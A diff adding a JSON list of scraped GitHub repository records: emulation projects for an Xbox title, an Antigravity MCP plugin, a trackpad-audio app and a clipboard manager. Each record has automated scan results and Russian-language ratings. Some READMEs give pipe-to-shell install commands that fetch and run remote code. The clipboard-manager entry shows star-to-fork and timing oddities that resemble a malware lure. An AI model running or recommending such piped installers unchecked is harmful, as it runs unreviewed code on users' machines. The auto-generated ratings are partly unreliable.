@@ -1,0 +1,601 @@
+[
+  {
+    "raw": {
+      "full_name": "fxceless/victory-fork",
+      "html_url": "https://github.com/fxceless/victory-fork",
+      "description": "Work-in-progress fork of VIctory: getting an Xbox Series title to render and run on a Windows PC. No game files.",
+      "stars": 2861,
+      "forks": 778,
+      "language": "Rust",
+      "license": "GPL-3.0",
+      "created_at": "2026-11-24T18:02:37Z",
+      "pushed_at": "2026-11-25T16:54:06Z",
+      "topics": [],
+      "readme_excerpt": "# VIctory fork (work in progress)\n\nA work-in-progress fork of [VIctory](https://github.com/Marvisak/VIctory), a\ncompatibility layer that runs an Xbox Series title natively on Windows from\nfiles the user supplies. This fork follows upstream\n`main` and adds fixes aimed at one goal: getting the game's world to render\ncorrectly and playably on one particular PC.\n\n**This repository contains no game files, code or assets.** You need your own\ncopy of the game. It is not affiliated with or endorsed by the game's\ndeveloper or publisher.\n\n## Credits\n\n- **[VIctory](https://github.com/Marvisak/VIctory)** by Marvisak and its\n  contributors is the base of everything here: the loader, the runtime\n  services, the Direct3D 12 back end and the shader recompiler. Licensed\n  GPL-3.0-or-later; so is this fork. Upstream's history is kept intact below\n  the single commit that carries this fork's changes.\n- **[XCL](https://github.com/ivall/xcl)** by ivall and its contributors\n  (GPL-2.0-only) was used as a reference for how the same title behaves under\n  another layer. Fixes inspired by it were written anew in VIctory's code.\n- The guard over every view of a memory page is code by **myokex**\n  ([victory-amd](https://github.com/myokex/victory-amd), commit `c6dc4d8`), which\n  adapts pull request #115 here by Spexivus, its correction by joroyt and a part of\n  VIctory #1122 by tightfall. The read-beside fix for kernel reads into title\n  memory is by **Joshua Odom** (commit `10ea38e` of the same fork family). Both\n  are carried here unchanged apart from one merge conflict.\n- This fork's changes were developed with [Claude Code](https://claude.com/claude-code).\n\n## Status of this fork (2026-11-25)\n\n**Not playable yet: 2.5 to 4 frames per second, and shadowed areas are black.**\nTested on one machine: Windows 11, Intel i7-14700KF, NVIDIA RTX 4070 12 GB,\n32 GB RAM. The Series X profile is used throughout.\n\n| Stage | State in this fork |\n|-------|--------------------|\n| Boot, menus, start screen | works, 30 fps (as upstream) |\n| Opening cutscene | plays from start to finish, in order, lit: title cards, credits cards, night and dusk shots |\n| Saves | the game autosaves a checkpoint and loads it again |\n| First gameplay scene (the prologue) | renders: characters, textures, sky, sunlit exterior; HUD, pause menu and pad input work |\n| Light in shadow | missing: the game's ray-traced bounce light and ray-traced lamp and sun shadows do not run yet, so anything the sun does not hit directly is black |\n| Frame rate in the world | 2-4 fps: 420-450 ms per frame by default, 240-350 ms with the newer switches (`VICTORY_RELAY=2`, or `VICTORY_LATE_WAIT=3 VICTORY_WIDE_BACK=1 VICTORY_CARD_BUFFERS_MIN_MB=1 VICTORY_CARD_BUFFERS_MB=1024`); it started at 3-6 seconds per frame |\n| Stability | no driver hang or device loss in normal runs (a hang introduced by the wave64 update was found and fixed: its barrier form for 64-lane programs is now off unless `VICTORY_WAVE_WIDE=1`) |\n\n### Newest (2026-11-25, later the same day)\n\n**Update, 2026-11-25 afternoon: what a frame is made of, measured, and two\nchanges that hold.** First rooms, about 3,850 draws a frame: 104 ms a frame\n(9.6 frames a second) with the first two changes below, 97 ms (10.3)\nwith all of them, from about 120 ms in the morning. Still far from the console's 33 ms.\n- How the title paces itself (new meters in `fence.rs` and\n  `console_insn.rs`): it never asks for an event. Each frame begins with\n  one small submission and a signal, and a title thread then waits for\n  that fence value by reading it in memory with `monitorx` / `mwaitx`\n  (AMD-only: about 280,000 emulated exceptions a second on an Intel\n  processor, all from this wait). The value is set when the layer has\n  finished the whole frame before. So a frame is the time the layer needs\n  for one frame's burst of submissions plus about 20 ms of the title's\n  own; putting presents behind the line, or giving the title's threads\n  more processors, changes nothing (both me",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0, osv: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "fxceless/victory-fork",
+      "summary": "Форк проекта VIctory, позволяющий запускать Xbox Series игру на Windows с помощью совместимости. Включает исправления для корректного рендеринга и работы конкретного ПК.",
+      "usefulness": "Подходит для разработчиков и энтузиастов, желающих исследовать и улучшать совместимость игр Xbox Series на Windows, а также для тех, кто хочет экспериментировать с рендерингом и производительностью.",
+      "uniqueness": "В отличие от оригинального VIctory, этот форк ориентирован на конкретную игру и содержит специфические патчи для улучшения рендеринга и производительности на определённом железе.",
+      "pros": [
+        "Высокая активность и популярность",
+        "Чёткая лицензия GPL-3.0",
+        "Поддержка Direct3D 12 и шейдерного компилятора",
+        "Наличие подробного README с историей изменений"
+      ],
+      "cons": [
+        "Пока не полностью работоспособен (2.5–4 FPS)",
+        "Ограничено одной конкретной игрой",
+        "Отсутствуют собственные игровые файлы"
+      ],
+      "audience": [
+        "backend",
+        "devops",
+        "cli",
+        "security"
+      ],
+      "score": 9.0
+    },
+    "final_score": 4.123
+  },
+  {
+    "raw": {
+      "full_name": "INK-Q/agy-fast",
+      "html_url": "https://github.com/INK-Q/agy-fast",
+      "description": "Non-invasive MCP accelerator plugin for Google Antigravity (CLI/Desktop/IDE): cuts LLM turns (-34%), token quota (-31%), and upload traffic (-40%) without affecting native UI or diffs.",
+      "stars": 1477,
+      "forks": 85,
+      "language": "TypeScript",
+      "license": "MIT",
+      "created_at": "2026-11-19T04:58:46Z",
+      "pushed_at": "2026-11-25T14:01:33Z",
+      "topics": [
+        "ai-agent",
+        "ai-coding",
+        "antigravity",
+        "antigravity-cli",
+        "antigravity-ide",
+        "antigravity-plugins",
+        "coding-agent",
+        "context-optimization",
+        "developer-productivity",
+        "developer-tools",
+        "gemini",
+        "google-antigravity",
+        "latency-optimization",
+        "mcp",
+        "mcp-plugin",
+        "mcp-server",
+        "model-context-protocol",
+        "performance",
+        "plugin",
+        "token-optimization"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"assets/logo-light.svg\" />\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"assets/logo-dark.svg\" />\n  <img src=\"assets/logo.svg\" alt=\"agy-fast logo\" width=\"80\" />\n</picture>\n\n# agy-fast\n\n**Latency, Token-Quota & Tool-Call Accelerator Plugin for Google Antigravity**\n\n[![Version](https://img.shields.io/github/v/tag/INK-Q/agy-fast?label=version&sort=semver&style=flat-square&color=38BDF8&labelColor=0F172A)](CHANGELOG.md)\n[![GitHub Stars](https://img.shields.io/github/stars/INK-Q/agy-fast?style=flat-square&color=FACC15&labelColor=0F172A)](https://github.com/INK-Q/agy-fast/stargazers)\n[![Node.js >= 20](https://img.shields.io/badge/node-%3E%3D20-22C55E?style=flat-square&logo=node.js&logoColor=white&labelColor=0F172A)](#quick-start)\n[![Runtime Dependencies: 0](https://img.shields.io/badge/runtime%20deps-0-38BDF8?style=flat-square&labelColor=0F172A)](#how-it-works)\n[![Platforms](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-64748B?style=flat-square&labelColor=0F172A)](#quick-start)\n[![MIT License](https://img.shields.io/badge/license-MIT-22C55E?style=flat-square&labelColor=0F172A)](LICENSE)\n[![Glama MCP Server](https://glama.ai/mcp/servers/INK-Q/agy-fast/badges/score.svg)](https://glama.ai/mcp/servers/INK-Q/agy-fast)\n[![HOL Guard Verified](https://img.shields.io/endpoint?url=https%3A%2F%2Fhol.org%2Fapi%2Fregistry%2Fbadges%2Fplugin%3Fslug%3Dink-q%252Fagy-fast%26metric%3Dscore&style=flat-square&labelColor=0F172A)](https://hol.org/registry/plugins/ink-q%2Fagy-fast?utm_source=hol_marketplace&utm_medium=plugins_badge&utm_campaign=plugins&utm_content=ink-q%2Fagy-fast&ref=plugin-author-5dc88d78)\n\nEnglish · [简体中文](README.zh-CN.md) · [Quick Start](#quick-start) · [Benchmarks](#real-world-benchmarks) · [MCP Tools](#the-5-mcp-tools) · [Analysis Report](docs/ANALYSIS_REPORT.md) · [Changelog](CHANGELOG.md)\n\n</div>\n\n<br />\n\n**`agy-fast`** is a zero-dependency, policy-compliant local [MCP](https://modelcontextprotocol.io/) plugin for **Google Antigravity** (CLI `agy`, Desktop 2.0, and IDE). It cuts agent wall-clock latency, billable token quota, and upload traffic by consolidating high-frequency searches, multi-language symbol outlines, atomic multi-file edits, and build/test checks into batched local calls—and injecting a sub-50 ms workspace snapshot once per session—without altering Antigravity's native UI, diff viewer, modified-files list, checkpoints, or safety checks.\n\n| LLM Turns / 10 Actions | Est. Billable Quota | Tool-Return Upload | Spills & Native UI Impact |\n| :---: | :---: | :---: | :---: |\n| **-33.7%**<br><sub>`-38.2%` ≥150k ctx · `-58.8%` subagents</sub> | **-31.5%**<br><sub>`-36.5%` ≥150k ctx · `-54.0%` subagents</sub> | **-39.7%**<br><sub>`-53.7%` uncached fresh input</sub> | **0**<br><sub>`≤8.8 KB` inline cap · Native diff & UI untouched</sub> |\n\n<p align=\"center\">\n  <img src=\"assets/demo-before-after.gif\" alt=\"agy-fast Before vs. After multi-file workflow comparison: 6 turns (48.2s) reduced to 2 turns (14.1s) with 0 disk spills\" width=\"100%\" />\n</p>\n\n## Quick Start\n\n**Requirements:** **Node.js >= 20** (no `npm install` needed — pre-built, unminified zero-dependency ESM bundles are included in `dist/`). Optional: [`ripgrep` (`rg`)](https://github.com/BurntSushi/ripgrep) for faster code search (automatically falls back to pure Node.js when absent).\n\n### One-Command Install (Recommended)\n\nInstalls runtime files to `~/.gemini/config/plugins/agy-fast`, runs `agy plugin validate --strict` and `agy plugin enable agy-fast` when `agy` is installed, and verifies both the MCP server and `SessionStart` hook live:\n\n**macOS / Linux:**\n```bash\ncurl -fsSL https://raw.githubusercontent.com/INK-Q/agy-fast/main/install.sh | sh\n```\n\n**Windows (PowerShell):**\n```powershell\nirm https://raw.githubusercontent.com/INK-Q/agy-fast/main/install.ps1 | iex\n```\n\n> [!TIP]\n> **Activating in Desktop 2.0 / IDE:** Open **Customizations → Installed",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0, osv: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "INK-Q/agy-fast",
+      "summary": "agy-fast – плагин для Google Antigravity, ускоряющий взаимодействие с LLM: снижает задержку, потребление токенов и трафик при сохранении нативного UI.",
+      "usefulness": "Нужен разработчикам, использующим Antigravity CLI/IDE, которые хотят повысить производительность и экономить токены и трафик.",
+      "uniqueness": "Обеспечивает ускорение без сторонних зависимостей, поддерживает несколько платформ и интегрируется с MCP, в отличие от обычных прокси‑плагинов.",
+      "pros": [
+        "Zero‑dependency, простая установка",
+        "Поддержка macOS, Linux, Windows",
+        "Снижение задержки до 34 %",
+        "Экономия токенов и трафика",
+        "Документированная API и примеры"
+      ],
+      "cons": [
+        "Ограничено только Google Antigravity",
+        "Меньше активных contributors по сравнению с аналогами",
+        "Документация фрагментарна, но достаточна"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "developer-tools",
+        "performance",
+        "ai-agent"
+      ],
+      "score": 9.0
+    },
+    "final_score": 4.108
+  },
+  {
+    "raw": {
+      "full_name": "Marvisak/VIctory",
+      "html_url": "https://github.com/Marvisak/VIctory",
+      "description": "An attempt at running GTA VI on PC",
+      "stars": 12304,
+      "forks": 1895,
+      "language": "Rust",
+      "license": "GPL-3.0",
+      "created_at": "2026-11-23T21:47:25Z",
+      "pushed_at": "2026-11-25T16:51:05Z",
+      "topics": [],
+      "readme_excerpt": "# VIctory\n\nRuns Grand Theft Auto VI (Xbox Series X|S) natively on Windows, from files\nthe user supplies.\n\nThe title's x86-64 code runs unchanged inside our process; VIctory supplies\nthe platform underneath it and converts the title's data, ahead of time where\nit can (shaders and pipelines too, see Getting started) and on first use\notherwise. See [docs/architecture.md](docs/architecture.md).\n\n## Status (2026-11-25)\n\n**Not playable yet, but you can get into the game.** The title boots, runs\nits menus at its own 30 fps, loads the world, plays the intro cutscene and\nreaches the **prologue**, the mission after it, with the graphics fully\ndisplayed, at about **1 frame per second**.\n\n| Stage | State |\n|-------|-------|\n| Boot, first-boot screens (accessibility, language, settings, legal) | works, 30 fps |\n| Intro video with sound | works |\n| Start screen, profile and saves | works |\n| Loading into the world (about a minute) | works |\n| The intro cutscene | plays at about 1 fps (0.9-1.0 s a frame, warm cache, quiet machine): textured and lit characters with whole hair, buildings, sky, depth of field, the title card, credits and interface. Missing: ray-traced shadows and indirect light, the local-light shadow mask. Seen in some shots: a pink band over nearer bodies, a stand-in head on a secondary character for a few frames |\n| The prologue | reached; the graphics are fully displayed, at about 1 fps |\n\nIn the intro cutscene at 1 fps the opening credits land over other shots than\non a console: they follow the frame count, the shots follow the clock.\n\nTested on one machine: Windows 11, AMD RX 6700 XT (12 GB).\n\n> **Warning.** Entering the world on a real GPU hung it in earlier builds,\n> and Windows then reset the display driver (every monitor goes black for a\n> moment). The latest runs, several minutes each in the world, did not, but\n> it is not ruled out; a run can also end on a GPU fault (`crashes.log`). A\n> diagnostics build with `VICTORY_D3D12_WARP=1` renders on the software\n> adapter instead (too slow to reach the world in minutes).\n\nWhat each part does today and what it still needs:\n\n| Subsystem | Today | Needs |\n|-----------|-------|-------|\n| Loader | Runs the title's executable and its DLLs in our process; crash reports name the faulting code and are kept in `crashes.log` | – |\n| Runtime services | One signed-in offline user, licences, packages, saves that survive a kill at any step, text entry dialog | Speech is silent; the dialog and relaunch are untested live |\n| Network | Offline by design: the title cannot reach the network | – |\n| Files and streaming | Archives and streamed data read, zlib and BCPack decoded in parallel | Loading is limited by writes into title memory |\n| Input | XInput pads, keyboard, keyboard stand-in pad | Trigger rumble |\n| Audio | Menu, video and loading sound; XMA voices and Opus streams decode | Reverb is silent; Opus results unverified against the title |\n| GPU: menus | Draws, compute and presentation on host D3D12; only changed title memory is copied | Frame pacing drifts on one screen in release builds |\n| GPU: world | The scene is drawn and presented: mesh pipelines, indirect execution, views the shaders pick from the heap themselves, title memory read by address, depth written from compute, lists that wait for values other queues write, textures made when a shader first reads them, pipelines pre-built or made by worker threads and kept on disk | The title's ray-tracing structures are never built (no ray-traced shadows or indirect light in the intro cutscene); about 1 s a frame; draws of untranslated shaders are dropped; real queries, depth bounds, HDR and scaling are missing |\n| Shaders | Console GPU code recompiled to DXIL, ahead of time (`translate --cache`) or at first use, cached on disk. Menus: all. World: all but under 300 of 24,387 programs | Merged geometry stages (195 programs) and under 100 others; fused multiply-adds follow the host GPU; some compute programs need a GPU with 64-lane wa",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0, osv: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "Marvisak/VIctory",
+      "summary": "VIctory – попытка запустить Grand Theft Auto VI на ПК, используя оригинальные файлы игры и обеспечивая совместимость с Windows.",
+      "usefulness": "Подходит для энтузиастов, желающих играть в GTA VI на ПК, а также для исследователей эмуляции и портирования игр.",
+      "uniqueness": "Использует оригинальный x86‑64 код без изменений, добавляя собственный слой совместимости и конвертацию данных, что отличает его от обычных эмуляторов.",
+      "pros": [
+        "Поддержка оригинального кода без модификаций",
+        "Низкая зависимость от сторонних библиотек",
+        "Активное сообщество с большим количеством звезд",
+        "Безопасность: отсутствие критических уязвимостей"
+      ],
+      "cons": [
+        "Пока не полностью работоспособен (только до пролога), FPS низкий",
+        "Отсутствует полная документация и примеры использования",
+        "Может возникать сбои на реальном GPU"
+      ],
+      "audience": [
+        "gaming",
+        "devops",
+        "security"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.955
+  },
+  {
+    "raw": {
+      "full_name": "xcl-dev/xcl",
+      "html_url": "https://github.com/xcl-dev/xcl",
+      "description": "Xbox Series compatibility layer for Windows - runs console game code natively, reimplements the console system libraries and recompiles RDNA2 shaders to DXIL",
+      "stars": 8181,
+      "forks": 1110,
+      "language": "Rust",
+      "license": "GPL-2.0",
+      "created_at": "2026-11-20T20:03:21Z",
+      "pushed_at": "2026-11-25T16:42:42Z",
+      "topics": [
+        "d3d12",
+        "gdk",
+        "rdna2",
+        "xbox"
+      ],
+      "readme_excerpt": "<p align=\"center\">\n  <img src=\"assets/readme/banner.svg\" width=\"100%\" alt=\"XCL – console games you own, running natively on Windows: no CPU emulation, RDNA2 shaders recompiled to DXIL, Direct3D 12\">\n</p>\n\n<p align=\"center\">\n  <a href=\"https://discord.gg/xcl\"><img alt=\"Discord: join the server\" src=\"https://img.shields.io/badge/Discord-join%20the%20server-7c5cff?style=for-the-badge\"></a>\n  <a href=\"https://github.com/xcl-dev/xcl/actions/workflows/ci.yml\"><img alt=\"CI\" src=\"https://img.shields.io/github/actions/workflow/status/xcl-dev/xcl/ci.yml?branch=main&style=for-the-badge&label=CI\"></a>\n  <a href=\"LICENSE\"><img alt=\"License: GPL-2.0-only\" src=\"https://img.shields.io/badge/license-GPL--2.0--only-7c5cff?style=for-the-badge\"></a>\n  <img alt=\"Windows 10 / 11 x64\" src=\"https://img.shields.io/badge/Windows-10%20%2F%2011%20x64-2f80ed?style=for-the-badge\">\n  <img alt=\"Direct3D 12, Shader Model 6.6\" src=\"https://img.shields.io/badge/D3D12-SM%206.6-1fb9d8?style=for-the-badge\">\n  <img alt=\"Rust\" src=\"https://img.shields.io/badge/Rust-stable--msvc-1fb9d8?style=for-the-badge\">\n</p>\n\n<p align=\"center\">\n  <b><a href=\"#games\">Games</a></b> ·\n  <b><a href=\"#highlights\">Highlights</a></b> ·\n  <b><a href=\"#how-it-works\">How it works</a></b> ·\n  <b><a href=\"#quick-start\">Quick start</a></b> ·\n  <b><a href=\"#what-works\">What works</a></b> ·\n  <b><a href=\"#controls\">Controls</a></b> ·\n  <b><a href=\"#building-and-usage\">Building and usage</a></b> ·\n  <b><a href=\"#tests\">Tests</a></b> ·\n  <b><a href=\"#contributing\">Contributing</a></b>\n</p>\n\n# XCL – Xbox Series X|S → Windows compatibility layer\n\nXCL is a compatibility layer that runs Xbox Series X|S (GDK) games you own on a Windows PC - in the spirit of Wine/Proton. There is no CPU emulation: the game's x64 code runs natively, and XCL provides its own, independently written implementations of the console system libraries the PC does not have (`kernelx.dll`, XGameRuntime, `d3d12_xs.dll`, …). The console's GPU code (RDNA2 machine code) is recompiled into PC shaders (HLSL → DXIL).\n\n> [!IMPORTANT]\n> XCL works only on unpacked game files you already own. It does not download, decrypt or unpack game packages (XVC / MSIXVC) and contains nothing for circumventing DRM. The repository holds no code, headers or binaries from the console SDK, no keys and no game data; the Windows components XCL relies on (XGameRuntime, XAudio2, D3D12, DXC) come from your own system or the public Windows SDK and are not distributed with XCL.\n\n<p align=\"center\"><img src=\"assets/readme/divider.svg\" width=\"100%\" alt=\"\"></p>\n\n## Games\n\n<p align=\"center\">\n  <img src=\"assets/readme/status.svg\" width=\"100%\" alt=\"A newer retail game, about 60 % of the way to playable (estimate): ~4 s to its first frame, 30 fps in its menus, ~5 fps in its 3D world, 100 % of its shaders translate\">\n</p>\n\n| Game | State | What works | Limits |\n|---|---|---|---|\n| **Minecraft Preview**<br><sub>`Microsoft.MinecraftBeta` 1.18.3064.0</sub> | ✅&nbsp;playable | fully playable | – |\n| **Unicorn Overlord**<br><sub>`SEGAofAmericaInc.Pa253b0c1Y` 1.0.0.6</sub> | ✅&nbsp;playable | fully playable | – |\n| **Fortnite**<br><sub>`436609B6.FortniteClient` 2.0.1461.7919</sub> | ✅&nbsp;works | works fully, as far as the game allows without its online services | the game itself is online-only (multiplayer servers) |\n| **XDefiant**<br><sub>`Ubisoft.XDefiant-Game` 1.0.0.186</sub> | ✅&nbsp;works | works fully, as far as the game allows without its servers | the game's own servers have been shut down |\n| **A newer retail game** | 🚧&nbsp;**≈&nbsp;60&nbsp;%**<br><sub>estimate</sub> | starts in ~4 s, runs at a steady 30 fps without a crash, shows its menus and goes on past the first one to its settings; fits a 32 GB machine (~15 GB committed in the menus). With the NVIDIA integration branch ([#2057](https://github.com/xcl-dev/xcl/pull/2057)) it goes on into its 3D world: **~5 fps there** on an RTX 5090 (14 fps on average over a whole 5-minute run, its menus and loading included) | ",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 29,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 29, gitleaks: 0, osv: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "xcl-dev/xcl",
+      "summary": "XCL – compatibility layer, allowing Xbox Series X|S games to run natively on Windows by reimplementing console system libraries and recompiling RDNA2 shaders to DXIL.",
+      "usefulness": "Разработчикам и геймерам, которые хотят запускать собственные Xbox Series игры на ПК без эмуляции CPU, а также исследователям графических API и разработчикам игр, ориентированных на Windows.",
+      "uniqueness": "В отличие от Wine/Proton, XCL не эмулирует CPU, а запускает x64 код напрямую, а также обеспечивает полную поддержку Direct3D 12 и Shader Model 6.6, а не только через эмуляцию.",
+      "pros": [
+        "Нативный запуск x64 кода без эмуляции CPU",
+        "Поддержка RDNA2 шейдеров, перекомпилированных в DXIL",
+        "Полноценная реализация системных библиотек Xbox",
+        "Активная CI и документация"
+      ],
+      "cons": [
+        "Ограниченная поддержка игр – пока только некоторые из списка",
+        "Требует Windows 10/11 x64 и Direct3D 12",
+        "Документация по API может быть неполной"
+      ],
+      "audience": [
+        "backend",
+        "devops",
+        "cli",
+        "security",
+        "gaming",
+        "graphics"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.946
+  },
+  {
+    "raw": {
+      "full_name": "os6/nospeaker",
+      "html_url": "https://github.com/os6/nospeaker",
+      "description": "make your macbook's trackpad talk using its haptic motor",
+      "stars": 1855,
+      "forks": 98,
+      "language": "Swift",
+      "license": "MIT",
+      "created_at": "2026-11-22T12:05:54Z",
+      "pushed_at": "2026-11-24T02:43:05Z",
+      "topics": [
+        "haptics",
+        "macos",
+        "swift",
+        "trackpad"
+      ],
+      "readme_excerpt": "```text\n────────────────────────  a90.com presents  ─────────────────────────\n\n    _   __ ____      _____  ____   ______ ___     __ __  ______ ____\n   / | / // __ \\    / ___/ / __ \\ / ____//   |   / //_/ / ____// __ \\\n  /  |/ // / / /    \\__ \\ / /_/ // __/  / /| |  / ,<   / __/  / /_/ /\n / /|  // /_/ /    ___/ // ____// /___ / ___ | / /| | / /___ / _, _/\n/_/ |_/ \\____/    /____//_/    /_____//_/  |_|/_/ |_|/_____//_/ |_|\n\n─  haptic voice synthesis  ─────────────────────────────  trackpad  ─\n```\n\n**Mute your Mac. Your trackpad will still talk.**\n\nThere's no speaker in a MacBook trackpad, just a small haptic motor that taps the glass so you feel a click.\nNO SPEAKER drives that motor up to 4,000 times a second, fast enough to make sound you can hear, and turns it\ninto a voice. It talks, sings, raps, and becomes an instrument under your finger.\n\nOne command. About a minute and a half. No speakers used.\n\n[Watch the demo on X](https://x.com/codycollier/status/2124505859883716918), with the sound on.\n\n## 01 / before you start\n\n```text\n[ mute your mac ]        it still talks; that's the point\n[ put it on a table ]    on your lap it's much quieter\n[ hands off the glass ]  until it asks you to touch it\n```\n\n**Space** skips a part. **q** or **Ctrl-C** goes to the end.\n\n## 02 / run it\n\n`[ one line ]`\n\n```sh\ncurl -fsSL a90.com/nospeaker | sh\n```\n\nDownloads the latest release to `~/.local/bin/nospeaker` and starts the show. `a90.com/nospeaker` points\nto [play.sh](play.sh) in this repo, so you can read what it runs first.\n\n`[ download ]`\n\nGrab `nospeaker.zip` from the [latest release](https://github.com/os6/nospeaker/releases/latest),\nunzip it and run `./nospeaker` in Terminal. Signed with a Developer ID and notarized by Apple.\n\n`[ from source ]`\n\nNeeds Xcode or the Command Line Tools (`xcode-select --install`). Builds one program for Apple Silicon\nand Intel Macs. Built with only the Command Line Tools, the Intel part needs macOS 13 or later.\n\n```sh\ngit clone https://github.com/os6/nospeaker\ncd nospeaker\n./build.sh\n./nospeaker\n```\n\n## 03 / play with it\n\n```text\n./nospeaker \"hello there\"            say anything\n./nospeaker --voice Daniel \"hello\"   in another macOS voice\n./nospeaker --sweep                  a rising tone, 100 Hz to 4 kHz\n\n--dark                               white on black\n--plain                              no visuals, plain text\n--external                           play through an external Magic Trackpad\n```\n\n## 04 / needs\n\nA Force Touch trackpad (built into MacBooks from 2015 on, or a Magic Trackpad 2 or newer), and macOS 12 or\nlater. Without a Force Touch trackpad, it says so and exits.\n\n```text\ntested on\n\nMacBook Pro (Mac17,10)         M5 Max   macOS 27.2.1   everything works\nMacBook Pro (MacBookPro15,1)   Intel    macOS 15.7.4   works, built from source\n```\n\nNot tested yet: a Magic Trackpad, and versions of macOS older than 15. MultitouchSupport is private, so\nolder systems may lack the functions it uses, and loudness differs between trackpads. If you try it on another\nMac, open an issue with your model, your macOS version and how it sounded.\n\n## 05 / how it works\n\n```text\nsay ──▶ formants ──▶ two tones ──▶ motor ──▶ glass\n        per 10 ms    F1 + F2       haptics   sound\n```\n\n**Why you can hear it.** The trackpad has no speaker, but the motor moves the glass. Driven back and forth\nhundreds or thousands of times a second, the glass vibrates fast enough to make sound you can hear. It's quiet\nbecause the motor is built for short taps, not for sound.\n\n**The motor.** `MultitouchSupport` is the private framework macOS uses for the trackpad. Its function\n`MTActuationCreateFromDictionary` takes a description of a vibration, a list of sine tones with a frequency,\na strength and a length each, and `MTActuationActuate` plays it on the motor. Apple's public haptics API only\noffers three fixed taps.\n\n**The range.** Measured with the MacBook's own microphone, every semitone from 98 Hz to 3,951 Hz: how loud it\nis over a quiet room, ",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "os6/nospeaker",
+      "summary": "Приложение, которое заставляет трекпад MacBook «говорить», используя его вибромотор для создания звуковых волн.",
+      "usefulness": "Подходит для пользователей, которые хотят слышать уведомления и сообщения без громкой динамики, а также для тех, кто ищет альтернативу звуковому выводу на MacBook.",
+      "uniqueness": "Использует только вибромотор трекпада, без внешних динамиков, и генерирует звук с частотой до 4000 Гц, что позволяет воспроизводить речь, музыку и даже ритмы.",
+      "pros": [
+        "Простой однострочный установочный скрипт",
+        "Поддержка Apple Silicon и Intel",
+        "Нотарифицировано и подписано Apple",
+        "Отсутствие критических уязвимостей"
+      ],
+      "cons": [
+        "Отсутствует подробная документация по API и настройкам",
+        "Меньше информации о совместимости с более старыми macOS",
+        "Не поддерживает кастомизацию звуковых эффектов"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "security",
+        "macos"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.913
+  },
+  {
+    "raw": {
+      "full_name": "Umbra9179/clipboard-history-manager-windows",
+      "html_url": "https://github.com/Umbra9179/clipboard-history-manager-windows",
+      "description": "Free open-source Windows clipboard manager with searchable history, image previews, tags, editing and backup.",
+      "stars": 1265,
+      "forks": 0,
+      "language": "C#",
+      "license": "MIT",
+      "created_at": "2026-11-23T21:40:15Z",
+      "pushed_at": "2026-11-23T21:40:42Z",
+      "topics": [
+        "clipboard",
+        "clipboard-history",
+        "clipboard-manager",
+        "desktop-app",
+        "desktop-application",
+        "dotnet",
+        "fluent",
+        "open-source",
+        "productivity",
+        "utility",
+        "windows",
+        "windows-10",
+        "windows-11",
+        "windows-app-sdk",
+        "windows-application",
+        "winui"
+      ],
+      "readme_excerpt": "![Windows Clipboard History Manager](assets/banner.png)\n\n<p align=\"center\">\n  <img src=\"https://img.shields.io/badge/license-MIT-green\" alt=\"MIT License\" />\n  <img src=\"https://img.shields.io/badge/platform-Windows-blue\" alt=\"Windows Platform\" />\n  <img src=\"https://img.shields.io/badge/status-Open%20Source-brightgreen\" alt=\"Open Source\" />\n  <img src=\"https://img.shields.io/badge/interface-WinUI-purple\" alt=\"WinUI\" />\n</p>\n\n**Windows Clipboard History Manager is a free, open-source clipboard manager designed to make copying, finding, editing, and reusing information effortless.** Keep a searchable history of copied text, images, files, and links in a modern Windows desktop application without using the command line.\n\nStop losing important snippets and repeatedly copying the same information. Keep everything organized and accessible from one convenient clipboard history.\n\n## ⬇️ Installation\n\n**Download the Windows application**\n\n1. Open the repository's [Releases](https://github.com/Umbra9179/clipboard-history-manager-windows/releases) page.\n2. Download the latest release archive **`Windows Clipboard History Manager 4.2.1.zip`**.\n3. Extract the archive into a folder of your choice.\n4. Keep **`Windows Clipboard History Manager 4.2.1.exe`** and `libvlc.dll` together in that folder.\n5. Double-click **`Windows Clipboard History Manager 4.2.1.exe`** to launch the application.\n\n\n## ✨ Features\n\n- 📋 **Unlimited Clipboard History** — Automatically maintain an extensive clipboard history so previously copied information remains available when you need it.\n- 🔎 **Instant Clipboard Search** — Search through saved clipboard entries and quickly locate text, links, images, and other copied content.\n- 🖼️ **Multiple Clipboard Formats** — Preserve formatted text, HTML, rich text, bitmap images, PNG images, and file references.\n- ✏️ **Edit Clipboard Entries** — Modify saved text and clipboard content before copying it again or sharing it with another application.\n- 🏷️ **Tags and Organization** — Add custom tags and organize clipboard entries into convenient groups for easier retrieval.\n- 🪟 **Application Filtering** — Control which source applications contribute clipboard entries and keep unwanted content out of your history.\n- 🖱️ **Drag and Drop Support** — Move supported clipboard items directly into compatible desktop 